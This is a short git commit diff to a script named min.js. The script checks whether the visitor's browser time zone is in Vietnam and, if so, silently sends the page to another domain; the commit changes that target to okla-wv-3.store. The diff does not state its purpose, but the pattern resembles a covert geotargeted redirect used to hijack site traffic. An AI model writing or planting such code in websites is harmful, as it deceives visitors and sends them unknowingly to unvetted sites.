1a2ffc58c5664d8d6be95ed639abe98b24ea064e
hai07t <hai07t@gmail.com>
2025-08-26 16:23:42 +0700

    Update min.js

--- min.js
+++ min.js
@@ -2,5 +2,5 @@ const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 console.log(userTimeZone);
 
 if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
-  window.location.href = "https://lobby10.n11s.io/";
+  window.location.href = "https://okla-wv-3.store/";
 }
